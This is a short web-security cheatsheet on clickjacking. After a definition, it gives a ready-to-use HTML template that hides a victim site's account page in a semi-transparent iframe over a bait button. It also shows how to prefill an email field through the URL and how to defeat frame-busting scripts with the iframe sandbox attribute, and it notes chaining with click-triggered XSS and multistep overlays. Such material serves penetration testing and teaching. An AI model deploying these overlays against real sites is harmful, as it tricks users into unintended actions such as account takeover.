---
title: Clickjacking
description: Clickjacking cheatsheet
---

# Clickjacking

## Definition

**Clickjacking**, also known as "UI redress attack" or "user interface redress attack," is a type of cyber attack where a malicious website or ad is designed to **trick users into clicking on something** other than what they think they are clicking on. This can be used to steal sensitive information, such as login credentials or personal information, or to perform actions on the user's behalf without their knowledge or consent.

## Cheatsheet

```html
<head>
<style>
#victim_website {
	position:relative;
	width:700px;
	height:520px;
	opacity:0.20;
	z-index:2;
}
#malicious_overlay {
	position:absolute;
	top:495px;
	left:70px;
	z-index:1;
}
</style>
</head>
<body>
	<div id="malicious_overlay">
	    <button>click</button>
	</div>
        <iframe id="victim_website" src="https://example.com/my-account"></iframe>
</body>
```

- Prefilled input : https://example.com/my-account?**email=toto@toto.com**
- Bypass JS script that block iframe like :

```html
<script>
if(top != self) {
    window.addEventListener("DOMContentLoaded", function() {
        document.body.innerHTML = 'This page cannot be framed';
    }, false);
}
</script>
```

Use iframe `sandbox` attribute ([list](https://www.w3schools.com/tags/att_iframe_sandbox.asp)). Like `<iframe id="victim_website" sandbox="allow-forms" src="https://example.com/my-account?email=toto@toto.com"></iframe>`.

- XSS that need a click (so use Clickjacking to do the action)
- Mutlistep clickjacking (click on 2 buttons, use 2 overlays)

## References

- [PortSwigger - Clickjacking](https://portswigger.net/web-security/clickjacking)